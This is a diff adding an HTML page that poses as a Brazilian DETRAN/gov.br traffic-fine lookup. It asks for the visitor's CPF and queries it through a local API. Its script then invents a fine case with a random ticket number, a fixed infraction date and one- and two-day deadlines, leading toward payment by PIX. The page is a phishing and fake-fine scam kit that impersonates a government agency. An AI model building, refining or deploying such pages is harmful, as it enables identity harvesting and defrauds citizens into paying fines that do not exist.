@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularize-se | DETRAN</title>
+    <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
+    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
+    <script src="../vendor/jquery-3.7.1.min.js"></script>
+    <script src="../vendor/jquery.mask-1.14.16.min.js"></script>
+    <script src="../vendor/tailwindcss.js"></script>
+    <style>
+        #cpf.error_input { border-color: #ef4444 !important; box-shadow: 0 0 0 1px #ef4444; }
+        #redirecionamento:disabled { opacity: 0.55; cursor: not-allowed; }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <div id="root">
+        <div class="min-h-screen flex flex-col relative">
+            <div class="fixed inset-0 z-0 bg-cover bg-center bg-no-repeat" style="background-image: url('../index_files/detran-bg.png');"></div>
+            <div class="fixed inset-0 z-0 bg-white/30"></div>
+
+            <header class="relative z-10 bg-white/95 shadow-sm border-b backdrop-blur-sm">
+                <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center">
+                    <div class="flex items-center overflow-hidden min-w-0">
+                        <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
+                        <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0">
+                            <h1 class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis">Sistema de Infrações e Multas</h1>
+                            <p class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis">DETRAN - Departamento de Trânsito</p>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="relative z-10 bg-slate-100/95 border-b border-slate-200 backdrop-blur-sm">
+                <div class="max-w-3xl mx-auto px-3 sm:px-4 py-2">
+                    <p class="text-xs sm:text-sm text-gray-700">Consulta de infrações de trânsito — <span class="font-medium text-gray-900">acesso ao sistema</span></p>
+                </div>
+            </div>
+
+            <main class="relative z-10 flex-1 flex items-start sm:items-center justify-center px-3 sm:px-4 py-8 sm:py-12">
+                <div class="w-full max-w-md">
+                    <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+                        <div class="px-5 py-4 border-b border-gray-100 bg-gray-50">
+                            <h2 class="text-base sm:text-lg font-semibold text-gray-900">Consulta de multas</h2>
+                            <p class="text-xs sm:text-sm text-gray-500 mt-1">Informe seu CPF para verificar pendências e regularizar infrações.</p>
+                        </div>
+
+                        <div class="p-5">
+                            <form class="space-y-4" id="form-cpf">
+                                <div>
+                                    <label for="cpf" class="block text-sm font-medium text-gray-700 mb-1.5">CPF do condutor</label>
+                                    <input type="tel" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" class="w-full px-4 py-3 text-base border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="off" value="">
+                                    <div class="mt-1.5 space-y-1">
+                                        <span id="digite_cpf" class="text-sm text-red-600 hidden">Por favor, digite seu CPF.</span>
+                                        <span id="minimo_cpf" class="text-sm text-red-600 hidden">O CPF deve conter 11 dígitos.</span>
+                                        <span id="erro_api" class="text-sm text-red-600 hidden">Não foi possível consultar no momento. Tente novamente.</span>
+                                    </div>
+                                </div>
+
+                                <button id="redirecionamento" disabled="disabled" type="submit" class="w-full bg-blue-700 hover:bg-blue-800 disabled:hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md transition duration-150 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
+                                    Consultar multas
+                                </button>
+                            </form>
+                        </div>
+
+                        <div class="px-5 py-3 bg-gray-50 border-t border-gray-100">
+                            <p class="text-xs text-gray-500 text-center leading-relaxed">Ao continuar, você concorda com os termos de uso e política de privacidade do serviço.</p>
+                        </div>
+                    </div>
+
+                    <div class="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">1. Consulta</p><p class="text-xs text-gray-500">Verificação por CPF</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">2. Detalhes</p><p class="text-xs text-gray-500">Infrações localizadas</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">3. Pagamento</p><p class="text-xs text-gray-500">Regularização via PIX</p></div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        if ((window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') && window.location.port === '8000') {
+            window.location.replace(`http://localhost:8888${window.location.pathname}${window.location.search}${window.location.hash}`);
+        }
+
+        function onlyDigits(v) { return (v || '').replace(/\D/g, ''); }
+
+        function addDays(days) {
+            const d = new Date();
+            d.setDate(d.getDate() + days);
+            const dd = String(d.getDate()).padStart(2, '0');
+            const mm = String(d.getMonth() + 1).padStart(2, '0');
+            const yyyy = d.getFullYear();
+            return `${dd}/${mm}/${yyyy}`;
+        }
+
+        function randomDigits(size) {
+            let out = '';
+            for (let i = 0; i < size; i += 1) {
+                out += Math.floor(Math.random() * 10).toString();
+            }
+            return out;
+        }
+
+        function randomAlphaNum(size) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let out = '';
+            for (let i = 0; i < size; i += 1) {
+                out += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return out;
+        }
+
+        function makeOpaqueId() {
+            return `${randomAlphaNum(24)}${randomAlphaNum(24)}${randomAlphaNum(24)}`;
+        }
+
+        $(function () {
+            $('#cpf').mask('000.000.000-00');
+
+            $('#cpf').on('input blur', function () {
+                const ok = onlyDigits(this.value).length === 11;
+                if (ok) {
+                    $('#redirecionamento').removeAttr('disabled');
+                    $('#minimo_cpf').hide();
+                } else {
+                    $('#redirecionamento').attr('disabled', 'disabled');
+                }
+            });
+
+            $('#form-cpf').on('submit', async function (e) {
+                e.preventDefault();
+                $('#digite_cpf, #minimo_cpf, #erro_api').hide();
+                $('#cpf').removeClass('error_input');
+
+                const cpfInput = $('#cpf').val();
+                const cpf = onlyDigits(cpfInput);
+                if (!cpfInput) {
+                    $('#digite_cpf').show();
+                    $('#cpf').addClass('error_input');
+                    return;
+                }
+                if (cpf.length !== 11) {
+                    $('#minimo_cpf').show();
+                    $('#cpf').addClass('error_input');
+                    return;
+                }
+
+                const btn = $('#redirecionamento');
+                const oldText = btn.text();
+                btn.prop('disabled', true).text('Consultando...');
+
+                try {
+                    const res = await fetch(`/api/cpf?cpf=${encodeURIComponent(cpf)}`);
+                    const json = await res.json();
+                    if (!res.ok) throw new Error('api_error');
+
+                    const meta = {
+                        flowId: makeOpaqueId(),
+                        ticket: `DT${randomDigits(6)}`,
+                        prazoFinal: addDays(1),
+                        vencimento: addDays(2),
+                        dataInfracao: '04/04/2025',
+                        dataAutuacao: '04/04/2026',
+                        docCode: randomAlphaNum(10)
+                    };
+
+                    sessionStorage.setItem('cpf_lookup_payload', JSON.stringify(json));
+                    sessionStorage.setItem('cpf_lookup_cpf', cpf);
+                    sessionStorage.setItem('cpf_case_meta', JSON.stringify(meta));
+                    window.location.href = `consultando.html?id=${encodeURIComponent(meta.flowId)}`;
+                } catch (err) {
+                    $('#erro_api').show();
+                    btn.prop('disabled', false).text(oldText);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
